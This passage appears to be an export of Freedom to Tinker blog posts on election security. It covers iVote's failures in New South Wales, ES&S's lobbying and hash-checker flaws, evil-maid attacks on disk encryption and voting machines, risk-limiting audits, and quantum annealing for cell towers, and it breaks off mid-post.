is likely to bolster policy proposals that operate on a “guess and check” or randomized controlled trial basis, especially in social service settings where experimentation can happen at a small scale. It’s the policy equivalent of testing a household cleaning product on an inconspicuous area of the couch: an approach that, once it is feasible, becomes hard to argue against. We may indeed soon see a relative ascendance of quantitatively competent people at the high end of policymaking, as against today’s crop of comparatively qualitative, rhetoric-oriented lawyers. But the factual landscape over which any government must operate is itself constantly becoming more complex because of technology. Systems are becoming more complicated and more interdependent. Policymaking will still require politics, and that’s not something we’ll ever be able to leave to pure quants. I think we’re likely to see a continued central role for smart lawyers and public life. But quantitative competencies may partly displace rhetoric within the ideal lawyer’s skill set. McGinnis’s observations also point to a larger policy challenge stemming from the increasing complexity and opacity of computerized decision-making systems. The institutional decisions that drive key outcomes in people’s lives, from employment to mortgage lending to policing, are increasingly being reached by machine learning systems whose decision-making process is deeply resistant to human-readable summary. That’s a profound challenge for the accountability and responsiveness of governmental (and regulated private) decision-making. The demand that a decision be understandable to the people affected sits in tension with the desire to harness new technology to reach more successful decisions, however success may be defined."
"330","2022-06-28","2023-03-24","https://freedom-to-tinker.com/2022/06/28/how-not-to-assess-an-e-voting-system/","by Vanessa Teague, an Australian computer scientist, cryptographer, and security/privacy expert. (Part 2 of a 5-part series starting here) Australian elections are known for the secret ballot and a long history of being peaceful, transparent and well run. So it may surprise you to learn that the Australian state of New South Wales (NSW) is home to one of the world’s largest Internet voting projects, second only to Moscow’s by absolute number. In the 2021 New South Wales local government elections, 652,983 votes were received from the Internet, including more than one third of votes for the Sydney city council. The system suffered substantial downtime throughout polling day and the day before. There is no way to tell how many voters were disenfranchised. Electoral Commission estimates give a total of about 20,000 people who registered to use iVote but did not receive a voting credential in time to vote. About half of these probably voted on paper; the rest were disenfranchised. In many councils, the number of disenfranchised people was enough to change the election outcome. As a consequence, the Supreme Court of New South Wales voided the results in three local councils, though the results are highly uncertain in many other councils too. iVote has had serious reliability issues and security concerns since its inception. The protocol does not provide any genuine verification, either for the voter to check that their vote reflects their intentions, or for election observers to verify that the complete set of votes has been properly included and decrypted. In 2015, Alex Halderman and I showed that it was vulnerable to an Internet-based attacker who could take over the voting session and substitute a different vote. In 2017, a different set of colleagues found that a version of the vote could be decrypted directly by the server. In 2019, when Thomas Haines, Sarah Jamie Lewis, Olivier Pereira and I found serious cryptographic errors in the Swiss Internet voting system, the NSW Electoral Commission announced that iVote had the same problems. Unlike Switzerland, NSW attempted no serious reassessment of either the regulations or the system design. Even when their appointed auditing team raised concerns about hardcoded passwords, a possible opportunity to delete votes without detection, and inadequate procedures for ensuring that the executed code matched the audited code, the NSW Electoral Commission simply ran iVote again in 2021. No regulations were altered, and they continued to threaten jail time for sharing the source code, though the sharing of source code in Switzerland had led to the identification and correction of serious problems in NSW. We don’t have demographic or political data, either about who tried to use iVote or who was most impacted by its downtime. We do know, from NSW Electoral Commission reports, that about half of the voters affected by iVote’s downtime went to a polling place and voted on paper. This is extremely unlikely to be a random half—most probably, it was the well-off, healthy voters without caring responsibilities, long working hours on a Saturday, or physical or mobility challenges. The people actually excluded from the franchise by iVote’s downtime were people who were not easily able to suddenly make alternative arrangements, who probably included the more disadvantaged people often used as a justification for running Internet voting. There would have been some who were not able to vote on paper under any circumstances (such as those with physical disabilities) and those who suddenly found themselves under covid isolation orders despite intending to vote in a polling place. These people had no other voting option in NSW (the voters with disabilities should have been offered a verifiable voting option, but they weren’t). However, some of those disenfranchised by iVote’s downtime were people who would have had ample opportunity to apply for a mail-in vote, if they had known in advance that iVote would fail. Unreliable voting systems are most damaging to the voting rights of the people dependent upon them. The main long-term consequence of iVote’s downtime is that NSW elections will become much more secure and trustworthy because they will stop using iVote. Internet voting is not part of Australia’s proud history of innovative electoral progress. It is more accurately seen as part of a pattern of public-sector disregard for electronic security and privacy, which includes driver’s licenses, health data, and covid-tracing records. Serious, evidence-based security concerns were repeatedly ignored. By the time the reruns & possible lawsuits are settled, it will be much more expensive than running the election properly the first time. Undetectable fraud remains the primary concern. The worst thing about this election was not that ten thousand or more people were disenfranchised, but that 652,983 votes were included in the tally without the slightest evidence that they accurately reflected the voting intentions of eligible voters. (Next part: How the Swiss Post E-voting system addresses client-side vulnerabilities)"
"331","2022-05-12","2023-03-24","https://freedom-to-tinker.com/2022/05/12/ess-uses-undergraduate-project-to-lobby-new-york-legislature/","The New York State Legislature is considering a bill that would ban all-in-one voting machines. That is, voting machines that can both print votes on a ballot and scan and count votes from a ballot – all in the same paper path. This is an important safeguard because such machines, if they are hacked by the installation of fraudulent software, can change or add votes that the voter did not intend and never got a chance to see on paper. One voting machine company, Elections Systems and Software (ES&S), which makes an all-in-one voting machine, the ExpressVote XL, is lobbying hard against this bill. As part of its lobbying package, ES&S is claiming that “Rochester Institute of Technology researchers found zero attacks” on the ExpressVote XL, based on an article (included in ES&S’s lobbying package) from Rochester Institute of Technology entitled “RIT cybersecurity student researchers put voting machine security to the test.“ If this were actually a scientific article, one could critique it as actual science. But it’s not a scientific paper: The article is written by Scott Bureau, Senior Communications Specialist, RIT Marketing and Communications in the RIT public relations department. The article describes an undergraduate student “capstone project.” The students were interviewed by ES&S, allowed ES&S to inspect their testing site, and then signed a nondisclosure agreement with ES&S. The students made up two attack scenarios, then spent 10 days trying to find attacks. They found some vulnerabilities, but not one that could change votes. The students made public a one-page poster describing their project. It’s fine for undergraduate student work; capstone projects are a really useful part of engineering education. But it’s not a scientific paper that describes their methods, the limitations placed upon them by needing permission from ES&S, or, in any detail – their results. Even so, the students describe enough for me to notice that they missed three of the most important attack scenarios: Hacker intrusion into the ES&S corporate engineering network, stealing cryptographic keys and source code, or altering the software to be installed into all ExpressVote XL machines nationwide in the next software update. Hacker intrusion into the county election administrator’s network, stealing cryptographic keys and allowing manipulation of ballot-definition downloads. Stealing an ExpressVote XL anywhere in the country, not just in New York, and tearing it apart to reverse engineer and steal crypto keys. There may be many other attacks. That’s why penetration testing can never prove that a computer system is secure: pen-testing only examines the attacks that the pen-testers happen to think of. These are standard attacks. These are the ones that can be so effective and dangerous that there is good reason for banning such voting machines. Maybe those Rochester students are aware of such attacks. Maybe not. But it seems unlikely that ES&S would have given permission for such experiments. That’s why respectable academic security researchers don’t restrict their activities to those in the comfort zone of the corporations whose products they are examining.It is irresponsible and misleading of ES&S to characterize an undergraduate student project, conducted under conditions controlled by ES&S, described in a publicity puff-piece written by a public-relations flack, as “RIT researchers found zero attacks.”"
"332","2021-11-15","2023-03-24","https://freedom-to-tinker.com/2021/11/15/could-quantum-computers-be-cost-effective-by-2036/","In theory, quantum computers could be much more efficient at some kinds of tasks, which could be potentially disruptive in applications areas such as cryptography. But you know: in theory, theory and practice are the same, but in practice, they are not. So it’s interesting to find applications where quantum computing might possibly be useful and cost-effective in the near(ish) future. So let’s talk about cell-phone towers. A 5G base station contains a phased-array antenna, that is, a 2-d array of small antennas that can be aimed in a particular direction (for sending or receiving) by adjusting the phase of their signal. And with the superposition principle, this phased-array antenna can simultaneously aim one signal at your iPhone here, while aiming another signal at that Android phone over there, and hundreds more devices all at once. To do that the base station must compute a difficult (NP-complete) combinatorial optimization problem every few milliseconds, as the phones move around. This is called “Massive MIMO,” Massive Multiple-Input-Multiple-Output communication. Why bother? Well, in dense and expensive cities, it’s so expensive to construct another cell-phone tower that it’s worth the cost of continuous heavy computation to optimize the number of simultaneous connections that each tower can handle. That cost is mostly in the electricity it takes to run a big high-powered compute server for the base station–both in dollars and in carbon footprint. Recently my colleague Kyle Jamieson and his student Srikar Kasi published a couple of papers demonstrating that a commercially available Quantum Annealing computer, the D-Wave, can solve toy-scale MIMO antenna optimization problems. Unlike “gate model” quantum computers, which implement Von Neumann machines that can compute in a superposition of states, quantum annealing finds optimal or near-optimal solutions to node labeling on a weighted undirected graph. You might think that this is not very general, but plenty of real-world optimization problems can be encoded into this graph problem. And, more to the point: small-to-medium scale quantum annealing computers are practical and commercially available now, whereas gate-model quantum computers are not yet practical except at tiny scale. But still, quantum annealing computers (such as the D-Wave) are expensive, and require special refrigeration units to get them down to 15 milliKelvin. Could there really be an application where it’s more cost-effective to buy one of those, instead of just a rack full of Arm servers? Massive MIMO, the antenna-aiming problem, is a good candidate: it demands that the same specialized NP-complete problem be solved every millisecond; and improving the optimization means that more cell-phone conversations can be handled by the same expensive cell tower. A new paper by Srikar Kasi and colleagues at Princeton, InterDigital, and University College London tries to answer the question, “based on current trends in the improvement of commercially shipped quantum annealing hardware, how many years in the future will be it cheaper to run a quantum annealer than to run a rack full of conventional servers?” And the answer is, maybe in the range 2027-2036 the two solutions will be equally cost-effective for medium-large cellular base stations. And maybe after 2036 the quantum annealer will consume 45% less electricity (be 45% cheaper to run) than conventional computers for large cellular base stations. That’s pretty exciting. Because up to now I thought that quantum computing is the technology of the future and always will be. But 2036 is only fifteen years away, and maybe we’ll really see this happen. Additional remark: Quantum simulators are another kind of special-purpose (not gate-model) soon-or-now practical quantum computer. What I find interesting about Massive MIMO is that the quantum computer is solving a combinatorial optimization problem that is not directly about quantum mechanics."
"333","2021-11-04","2023-03-24","https://freedom-to-tinker.com/2021/11/04/another-2020-lawsuit-over-internet-voting/","Last week I summarized 4 lawsuits filed in 2020 over internet voting, in VA, NJ, NY, NH. Then I learned there was another in North Carolina. In 2020 the North Carolina Council of the Blind sued the State Board of Elections, demanding that the Board offer “alternative format absentee ballots allowing private and independent method of absentee ballots that is accessible for Plaintiffs and others with vision disabilities.” The Plaintiffs did not specifically demand internet ballot return. Instead, they demanded compliance with the Americans for Disabilities Act that requires “reasonable modifications in the Absentee Voting Program to avoid discrimination against Plaintiffs on the basis of disability.” The Plaintiffs also explained methods that other states were already using to accomplish this [all excerpted verbatim from the Complaint]: Maryland developed an online marking tool that allows voters to access and mark their absentee ballots on their computers. . . . Although the absentee ballot must still be printed, signed, and returned to the voter’s local board of election, voters need not sacrifice the secrecy of their ballots to receive assistance with signing because the signature page prints separately from the ballot. Oregon, Wisconsin, and New Hampshire have employed an accessible electronic voting system that can be used for both in-person and absentee voting. Using the platform, voters can access their absentee ballots through their web browser and mark their ballots on their computers. Voters then print their ballots and mail them back to their local boards of election where their votes are counted. … The platform used by these states has been released as open source technology, meaning that it can be used by the NCSBOE, or by any other entity, free of charge. West Virginia has similarly provided an electronic absentee ballot delivery and marking tool to voters with disabilities. Voters access the electronic absentee ballot tool via a web portal, where they are guided with on-screen instructions on how to open and complete the electronic ballot. After completing the ballot, West Virginia law provides that qualifying voters may either (1) print and mail their absentee ballot to their county clerk, or (2) submit their absentee ballot electronically to their county clerk directly through the web portal. Alaska [has] have provided accessible remote voting options for some elections . . . an electronic absentee ballot that can be completed and transmitted using the voter’s computer. Michigan made its UOCAVA PDF ballots accessible and available to blind voters . . . [but no electronic return of voted ballots] New York . . . agreed to email accessible absentee ballots to qualified voters with disabilities [but no electronic return of voted ballots] In summary, the Complaint laid out a variety of ways in which other states had complied with the ADA, but did not specifically request internet ballot return. The motion for preliminary injunction was similarly open-ended. The Court, apparently, felt that such an open-ended injunction would be difficult to enforce. And apparently North Carolina was already using Democracy Live’s system for UOCAVA voters, and said so in court. So the Court’s order read, “Defendants are hereby ORDERED to open the Democracy Live portal to plaintiffs and other blind voters as expeditiously as possible so that it may be utilized for the November 3, 2020 election.” A year later, in August 2021, the State agreed to settle the case, having agreed to use the Democracy Live “accessible electronic voting portal” through which “the State Board provides visually impaired voters the ability to request to vote absentee, to mark their absentee ballots, and to return their absentee ballots.” In addition they “identified . . . vendors who are capable providing Large Print, Braille, or accessible electronic formats of absentee ballots and other communications related to voting processes.” Judge Boyle’s final judgment omits any mention of Democracy Live, and orders “The North Carolina State Board of Elections (“NCSBE”) shall ensure that blind voters can request, mark, and return their absentee ballot through accessible electronic means in the 2021 municipal elections (whenever held) and in all subsequent elections.” (emphasis mine) So it appears that internet voting for blind voters in North Carolina currently has the force of law behind it. It’s too bad that an opportunity was lost here. Last week I wrote, “it would be a good idea for the National Federation of the Blind to remove internet ballot return from its set of demands, and focus on the other reasonable and practical reforms that they have been requesting (or suing for).” And here is a case where the North Carolina Council for the Blind had already done just what I suggested, demanding “reasonable modifications in the Absentee Ballot program” but not specifically demanding the insecure, unsafe, unverifiable extreme of internet ballot return. The North Carolina State Board of Elections then unnecessarily chose to include internet voting in their response, because their vendor (Democracy Live) made that convenient for them. (Democracy Live does that even more insecurely than you might have imagined! And each of their competitors does internet voting insecurely in its own surprising way!) And then Judge Boyle enshrined this expedient into an Order. I am not a lawyer. But a lawyer friend writes: This judgment is only a legal way station; don’t assume this is anything near a permanent order, if other evidence is later adduced undermining its soundness. And really, the Plaintiffs’ initial motion was very poor lawyering in one critical respect: the request for “reasonable modifications” with examples from other States was basically punting to the Federal Judge to do their thinking for them, for the court to supply the terms for a precise order that for some inexplicable reason, they did not craft and then support in their brief. It’s not surprising that, given the lack of expertise in the federal courts on internet voting insecurity, election security ambiguities, and various NC election administrative requirements, that the court (likely law clerks) jumped to the Democracy Live solution, which NC had already adopted for a different purpose."
"334","2021-08-13","2023-03-24","https://freedom-to-tinker.com/2021/08/13/its-still-practically-impossible-to-secure-your-computer-or-voting-machine-against-attackers-who-have-30-minutes-of-access/","It has been understood for decades that it’s practically impossible to secure your computer (or computer-based device such as a voting machine) from attackers who have physical access. The basic principle is that someone with physical access doesn’t have to log in using the password, they can just unscrew your hard drive (or SSD, or other memory) and read the data, or overwrite it with modified data, modified application software, or modified operating system. This is an example of an “Evil Maid” attack, in the sense that if you leave your laptop alone in your hotel room while you’re out, the cleaning staff could, in principle, borrow your laptop for half an hour and perform such attacks. Other “Evil Maid” attacks may not require unscrewing anything, just plug into the USB port, for example. And indeed, though it may take a lot of skill and time to design the attack, anyone can be trained to carry it out. Here’s how to do it on an unsophisticated 1990s-era voting machine (still in use in New Jersey): Andrew Appel replacing a memory chip on an AVC Advantage voting machine, circa 2007. The sophisticated tool being used here is: a screwdriver More than twenty years ago, computer companies started implementing protections against these attacks. Full-disk encryption means that the data on the disk isn’t readable without the encryption key. (But that key must be present somewhere in your computer, so that it can access the data!) Trusted platform modules (TPM) encapsulate the encryption key, so attackers (even Evil Maids) can’t get the key. So in principle, the attacker can’t “hack” the computer by installing unauthorized software on the disk. (TPMs can serve other functions as well, such as “attestation of the boot process,” but here I’m focusing on their use in protecting whole-disk encryption keys.) So it’s worth asking, “how well do these protections work?” If you’re running a sophisticated company and you hire a well-informed and competent CIO to implement best practices, can you equip all your employees with laptops that resist evil-maid attacks? And the answer is: It’s still really hard to secure your computers against determined attackers. In this article, “From stolen laptop to inside the company network,” the Dolos Group (a cybersecurity penetration-testing firm) documents an assessment they did for an unnamed corporate client. The client asked, “if a laptop is stolen, can someone use it to get into our internal network?” The fact that the client was willing to pay money to have this question answered, already indicates how serious this client is. And, in fact, Dolos starts their report by listing all the things the client got right: There are many potential entry points that the client’s cybersecurity configuration had successfully shut down. Indeed, this laptop had full disk encryption (FDE); it had a TPM (trusted platform module) to secure the FDE encryption key; the BIOS was configured well, locked with a BIOS password, attack pathways via NetBIOS Name Service were shut down, and so on. But there was a vulnerability in the way that FDE talked to TPM over the SPI bus. And if that last sentence doesn’t speak to you, then how about this: They found one chip on the motherboard (labeled CMOS in the picture), Photo from Dolos Group, https://dolosgroup.io/blog/2021/7/9/from-stolen-laptop-to-inside-the-company-network that was listening in on the conversation between the trusted platform module and the full-disk encryption. They built a piece of equipment; they could give their equipment to an Evil Maid who could clip one of these onto the CMOS chip: and in a few seconds the Evil Maid could learn the secret key; then (in a few minutes) read the entire (decrypted) disk drive, or install a new operating system to run in Virtualized mode. FDE has been made irrelevant, so the TPM is also irrelevant. Then, the attacker can get into the corporate network. Or, what Dolos doesn’t describe, is that the attacker could install spyware or malware into the hard drive, remove the blue clip, screw the cover back on, and return the laptop to the hotel room. This vulnerability can be patched over; but computer systems are very complex these days; there will almost always be another security slip-up. And what about voting machines? Are voting machines well protected by TPM and FDE, and can the protections in voting machines be bypassed? For voting machines, the Evil Maid is not a hotel employee, it may be a corrupt election warehouse worker, a corrupt pollworker at 6am, or anyone who has unattended access to the voting machine for half an hour. In many jurisdictions, voting machines are left unattended at polling places before and after elections. We would like to know, “Is the legitimate vote-counting program installed in the voting machine, or has some hacker replaced it with a cheating program?” One way the designer/vender of a voting machine could protect the firmware (operating system and vote-counting program) against hacking is, “store it in an whole-disk-encrypted drive, and lock the key inside the TPM.” This is supposed to work, but the Dolos report shows that in practice there tend to be slip-ups. As an alternative to FDE+TPM that I’ve described above, there are other ways to (try to) ensure that the right firmware is running; they have names such as “Secure Boot” and “Trusted Boot”, and use hardware such as UEFI and TPM. Again, ideally they are supposed to be secure; in practice they’re a lot more secure than doing nothing; but in the implementation there may be slip-ups. The new VVSG 2.0, the “Voluntary Voting Systems Guidelines 2.0” in effect February 2021, requires cryptographic boot verification (see section 14.13.1-A) — that is, “cryptographically verify firmware and software integrity before the operating system is loaded into memory.” But the VVSG 2.0 doesn’t require anything as secure as (hardware-assisted) “Secure Boot” or “Trusted Boot”. They say, “This requirement does not mandate hardware support for cryptographic verification” and “Verifying the bootloader itself is excluded from this requirement.” That leaves voting machines open to the kind of security gap described in Voting Machine Hashcode Testing: Unsurprisingly insecure, and surprisingly insecure. That wasn’t just a slip-up, it was a really insecure policy and practice. And by the way, no voting machines have yet been certified to VVSG 2.0, and there’s not even a testing lab that’s yet accredited to test voting machines to the 2.0 standard. Existing voting machines are certified to a much weaker VVSG 1.0 or 1.1 that doesn’t even consider these issues. Even the most careful and sophisticated Chief Information Officers using state-of-the-art practices find it extremely difficult to secure their computers against Evil Maid attacks. And there has never been evidence that voting-machine manufacturers are among the most careful and sophisticated cyberdefense practitioners. Most voting machines are made to old standards that have zero protection against Evil Maid attacks; the new standards require Secure Boot but in a weaker form than TPMs; and no voting machines are even qualified to those new standards. Here’s an actual voting-machine hacking device made by scientists studying India’s voting machines. Just turn the knob on top to program which candidate you want to win: Voting-machine hacking device made by the authors of “Security Analysis of India’s Electronic Voting Machines”, by Hari K. Prasad et al., 17th ACM Conference on Computer and Communications Security, 2010. https://indiaevm.org/ Wholesale attacks on Election Management computers And really, the biggest danger is not a “retail” attack on one machine by an Evil Maid; it’s a “wholesale” attack that penetrates a corporate network (of a voting-machine manufacturer) or a government network (of a state or county running an election) and “hacks” thousands of voting machines all at once. The Dolos report can reminds us again why it’s a bad idea for voting machines to “phone home” on a cell-phone network to connect themselves to the internet (or to a corporate or county network): it’s not only that this exposes the voting machine to hackers anywhere on the internet, it also allows the voting machine (hacked by an Evil Maid attack) to attack the county network it phones up. Even more of a threat is that an attacker with physical access to an Election Management System (that is, state or county computer used to manage elections) can spread malware to all the voting machines that are programmed by the EMS. How hard is it to hack into an EMS? Just like the PC that Dolos hacked into, an EMS is just a laptop computer; but the county or state that owns it may not be as security-expert as Dolos’s client is. Likely enough, the EMS is not hard to hack into, with physical access. Conclusion: Don’t let your security depend entirely on “an attacker with physical access still can’t hack me.” So you can’t be sure what vote-counting (or vote-stealing) software is running in your voting machine. But we knew that already. Our protection, for accurate vote counts, is to vote on hand-marked paper ballots, counted by optical-scan voting machines. If those optical-scan voting machines are hacked, by an Evil Maid, by a corrupt election worker, or by anyone else who gains access for half an hour, then we can still be protected by the consistent use of Risk-Limiting Audits (RLAs) to detect when the computers claim results different from what’s actually marked on the ballots; and by recounting those paper ballots by hand, to correct the results. More states should consistently use RLAs. The use of hand-marked paper ballots with routine RLAs can protect us from wholesale attacks. But it would be better to have, in addition, proper cybersecurity hygiene in election management computers and voting machines. I thank Ars Technica for bringing the Dolos report to my attention. Their article concludes with many suggestions made by security experts for shutting down the particular vulnerability that Dolos found. But remember, even though you can (with expertise) shut down some particular loophole, you can’t know how many more are out there."
"335","2021-03-05","2023-03-24","https://freedom-to-tinker.com/2021/03/05/voting-machine-hashcode-testing-unsurprisingly-insecure-and-surprisingly-insecure/","By Andrew Appel and Susan Greenhalgh The accuracy of a voting machine is dependent on the software that runs it. If that software is corrupted or hacked, it can misreport the votes. There is a common assumption that we can check the legitimacy of the software that is installed by checking a “hash code” and comparing it to the hash code of the authorized software. In practice the scheme is supposed to work like this: Software provided by the voting-machine vendor examines all the installed software in the voting machine, to make sure it’s the right stuff. There are some flaws in this concept: it’s hard to find “all the installed software in the voting machine,” because modern computers have many layers underneath what you examine. But mainly, if a hacker can corrupt the vote-tallying software, perhaps they can corrupt the hash-generating function as well, so that whenever you ask the checker “does the voting machine have the right software installed,” it will say, “Yes, boss.” Or, if the hasher is designed not to say “yes” or “no,” but to report the hash of what’s installed, it can simply report the hash of what’s supposed to be there, not what’s actually there. For that reason, election security experts never put much reliance in this hash-code idea; instead they insist that you can’t fully trust what software is installed, so you must achieve election integrity by doing recounts or risk-limiting audits of the paper ballots. But you might have thought that the hash-code could at least help protect against accidental, nonmalicious errors in configuration. You would be wrong. It turns out that ES&S has bugs in their hash-code checker: if the “reference hashcode” is completely missing, then it’ll say “yes, boss, everything is fine” instead of reporting an error. It’s simultaneously shocking and unsurprising that ES&S’s hashcode checker could contain such a blunder and that it would go unnoticed by the U.S. Election Assistance Commission’s federal certification process. It’s unsurprising because testing naturally tends to focus on “does the system work right when used as intended?” Using the system in unintended ways (which is what hackers would do) is not something anyone will notice. Until somebody does notice. In this case, it was the State of Texas’s voting-machine examiner, Brian Mechler. In his report dated September 2020 he found this bug in the hash-checking script supplied with the ES&S EVS 6.1.1.0 election system (for the ExpressVote touch-screen BMD, the DS200 in-precinct optical scanner, the DS450 and DS850 high-speed optical scanners, and other related voting machines). (Read Section 7.2 of Mr. Mechler’s report for details). We can’t know whether that bug was intentional or not. Either way, it’s certainly convenient for ES&S, because it’s one less hassle when installing firmware upgrades. (Of course, it’s one less hassle for potential hackers, too.) Another gem in Mr. Mechler’s report is in Section 7.1, in which he reveals that acceptance testing of voting systems is done by the vendor, not by the customer. Acceptance testing is the process by which a customer checks a delivered product to make sure it satisfies requirements. To have the vendor do acceptance testing pretty much defeats the purpose. When the Texas Secretary of State learned that their vendor was doing the acceptance testing themselves, the SoS’s Election Division took an action “to work with ES&S and their Texas customers to better define their roles and responsibilities with respect to acceptance testing,” according to the report. They may encounter a problem, though: the ES&S sales contract specifies that ES&S must perform the acceptance testing, or they will void your warranty (see clause 7b) . There’s another item in Mr. Mechler’s report, Section 7.3. The U.S. Election Assistance Commission requires that “The vendor shall have a process to verify that the correct software is loaded, that there is no unauthorized software, and that voting system software on voting equipment has not been modified, using the reference information from the [National Software Reference Library] or from a State designated repository. The process used to verify software should be possible to perform without using software installed on the voting system.” This requirement is usually interpreted to mean, “check the hash code of the installed software against the reference hash code held by the EAC or the State.” But ES&S’s hash-checker doesn’t do that at all. Instead, ES&S instructs its techs to create some “golden” hashes from the first installation, then subsequently check the hash code against these. So whatever software was first installed gets to be “golden”, regardless of whether it’s been approved by the EAC or by the State of Texas. This design decision was probably a convenient shortcut by engineers at ES&S, but it directly violates the EAC’s rules for how hash-checking is supposed to work. So, what have we learned? We already knew that hash codes can’t protect against hackers who install vote-stealing software, because the hackers can also install software that lies about the hash code. But now we’ve learned that hash codes are even more useless than we might have thought. This voting-machine manufacturer has a hash-code checker that erroneously reports a match, even when you forget to tell it what to match against; checks the hash against what was first installed, not against the authorized reference that they’re supposed to; and the vendor insists on running this check itself — not letting the customer do it — otherwise the warranty is voided. As a bonus we learned that the EAC certifies voting systems without checking if the validation software functions properly. Are we surprised? You know: fool me once, shame on you; fool me twice, shame on me. Every time that we imagine that a voting-machine manufacturer might have sound cybersecurity practices, it turns out that they’ve taken shortcuts and they’ve made mistakes. In this, voting-machine manufacturers are no different from any other makers of software. There’s lots of insecure software out there made by software engineers who cut corners and don’t pay attention to security, and why should we think that voting machines are any different? So if we want to trust our elections, we should vote on hand-marked paper ballots, counted by optical scanners, and recountable by hand. Those optical scanners are pretty accurate when they haven’t been hacked — even the ES&S DS200 — and it’s impractical to count all the ballots without them. But we should always check up on the machines by doing random audits of the paper ballots. And those audits should be “strong” enough — that is, use good statistical methods and check enough of the ballots — to catch the mistakes that the machines might make, if the machines make mistakes (or are hacked). The technical term for those “strong enough” audits is Risk-Limiting Audit. Andrew W. Appel is Professor of Computer Science at Princeton University. Susan Greenhalgh is Senior Advisor on Election Security at Free Speech For People."
"336","2019-05-23","2023-03-24","https://freedom-to-tinker.com/2019/05/23/how-to-do-a-risk-limiting-audit/","In the U.S. we use voting machines to count the votes. Most of the time they’re very accurate indeed, but they can make big mistakes if there’s a bug in the software, or if a hacker installs fraudulent vote-counting software, or if there’s a misconfigured ballot-definition file, or if the scanner is miscalibrated. Therefore we need a Risk-Limiting Audit of every election to assure, independently of the voting machines, that they got the correct outcome. If your election official picks a risk-limit of 5%, that means that if the voting system got the wrong outcome, there’s a 95% chance that the RLA will correct it (and there’s a 0% chance the RLA will mess up an already-correct outcome). But how does one conduct an RLA? The statistics are not trivial; the administrative procedures are not obvious–how do you handle all those batches of paper ballots? And every state has different election procedures, so there’s no one-size-fits all RLA method. Two good ways to learn something are to read a book or find an experienced teacher. But until recently, most (but not all) papers about RLAs were difficult to understand for the election-administrator audience, and practically no one had experience running RLAs because they’re so new. That’s changing for the better. More states are conducting RLA pilots, that means more people have experience designing and implementing RLAs, and some of those people do us the public service of writing it down in a handbook for election administrators. Jennifer Morrell has just published the first two parts of a guide to the practical aspects of RLAs: what are they, why do them, how to do them. Knowing It’s Right, Part One: A Practical Guide to Risk-Limiting Audits. A high level overview for state and local stakeholders who want to know more about RLAs before moving on to the implementation phase. Knowing It’s Right, Part Two: Risk-Limiting Audit Implementation Workbook. Soup-to-nuts information on how election officials can conduct a ballot-comparison audit. I really like these manuals. And if you’re looking for experts with real experience in RLAs, in addition to Ms. Morrell there are the authors of these experience reports on RLA pilots: Orange County, CA Pilot Risk-Limiting Audit, by Stephanie Singer and Neal McBurnett, Verified Voting Foundation, December 2018. City of Fairfax,VA Pilot Risk-Limiting Audit, by Mark Lindeman, Verified Voting Foundation, December 2018. And stay tuned at risklimitingaudits.org for reports from Indiana, Rhode Island, Michigan, and perhaps even New Jersey."
"337","2021-04-01","2023-03-24","https://freedom-to-tinker.com/2021/04/01/how-lever-action-voting-machines-really-worked/","Over the years I have written many articles about direct-recording electronic (DRE) voting machines, precinct-count optical-scan (PCOS) voting machines, ballot-marking devices (BMDs), and other 21st-century voting technology. But I haven’t written much about 20th-century lever machines; these machines were banned by the U.S. Congress in the Help America Vote Act and have not been used since 2012. Photo credit: Paul Buckowski / Times Union Recently, upon a midnight dreary, while I pondered, weak and weary, over many a quaint and curious volume of forgotten technology, I came across the excellent 1993 book, The Way Things Really Work, by Henry Beard and Rod Barrett. This book has a clear explanation of the inner workings of mechanical lever voting machines, as follows. I think it should now be clear why Congress banned this technology. The book also has explanations of “How candy machines eat your quarters,” “How airlines lose your luggage,” “How elevators know to close their doors when you come running,” and so on."
"338","2021-01-11","2023-03-24","https://freedom-to-tinker.com/2021/01/11/ess-voting-machine-company-sends-threats/","For over 15 years, election security experts and election integrity advocates have been communicating to their state and local election officials the dangers of touch-screen voting machines. The danger is simple: if fraudulent software is installed in the voting machine, it can steal votes in a way that a recount wouldn’t be able to detect or correct. That was true of the paperless touchscreens of the 2000s, and it’s still true of the ballot-marking devices (BMDs) and “all-in-one” machines such as the ES&S ExpressVote XL voting machine (see section 8 of this paper*). This analysis is based on the characteristics of the technology itself, and doesn’t require any conspiracy theories about who owns the voting-machine company. In contrast, if an optical-scan voting machine was suspected to be hacked, the recount can assure an election outcome reflects the will of the voters, because the recount examines the very sheets of paper that the voters marked with a pen. In late 2020, many states were glad they used optical-scan voting machines with paper ballots: the recounts could demonstrate conclusively that the election results were legitimate, regardless of what software might have been installed in the voting machines or who owned the voting-machine companies. In fact, the vast majority of the states use optical-scan voting machines with hand-marked paper ballots, and in 2020 we saw clearly why that’s a good thing. In November and December 2020, certain conspiracy theorists made unsupportable claims about the ownership of Dominion Voting Systems, which manufactured the voting machines used in Georgia. Dominion has sued for defamation. Dominion is the manufacturer of voting machines used in many states. Its rival, Election Systems and Software (ES&S), has an even bigger share of the market. Apparently, ES&S must think that amongst all that confusion, the time is right to send threatening Cease & Desist letters to the legitimate critics of their ExpressVote XL voting machine. Their lawyers sent this letter to the leaders of SMART Elections, a journalism+advocacy organization in New York State who have been communicating to the New York State Board of Elections, explaining to the Board why it’s a bad idea to use the ExpressVote XL in New York (or in any state). ES&S’s lawyers claim that certain facts (which they call “accusations”) are “false, defamatory, and disparaging”, namely: that the “ExpressVote XL can add, delete, or change the votes on individual ballots”, that the ExpressVote XL will “deteriorate our security and our ability to have confidence in our elections,” and that it is a “bad voting machine.” Well, let me explain it for you. The ExpressVote XL, if hacked, can add, delete, or change votes on individual ballots — and no voting machine is immune from hacking. That’s why optical-scan voting machines are the way to go, because they can’t change what’s printed on the ballot. And let me explain some more: The ExpressVote XL, if adopted, will deteriorate our security and our ability to have confidence in our elections, and indeed it is a bad voting machine. And expensive, too! It’s been clearly explained in the peer-reviewed literature how touch-screen voting machines–even the ones like the XL that print out paper ballots–can (if hacked) alter votes; and how most voters won’t notice; and how even if some voters do notice, there’s no way to correct the election result. And it’s been explained why machines like the ExpressVote XL are particularly insecure–as I said, see section 8 of this paper*. And it’s pretty clear that the folks at SMART Elections are aware of these scientific studies, and are basing their journalism and advocacy on good science. I’ll summarize here what’s explained in the paper: how the ExpressVote XL, if hacked, can change votes. If the machine is hacked, the software can do whatever the hacker has programmed, but the hacker can’t change the hardware. The hardware includes a thermal printer that can make black marks (i.e., print text or barcodes or whatever) on the paper, but the hardware can’t erase marks. Therefore you might think the ExpressVote XL, even if hacked, couldn’t alter votes. But consider this: suppose there are 15 contests on the ballot; suppose the voter makes choices for all 13 contests and chooses not to vote for State Senator. Then what the legitimate software does is, in the line for State Senator, print NO SELECTION MADE. But the hacked software 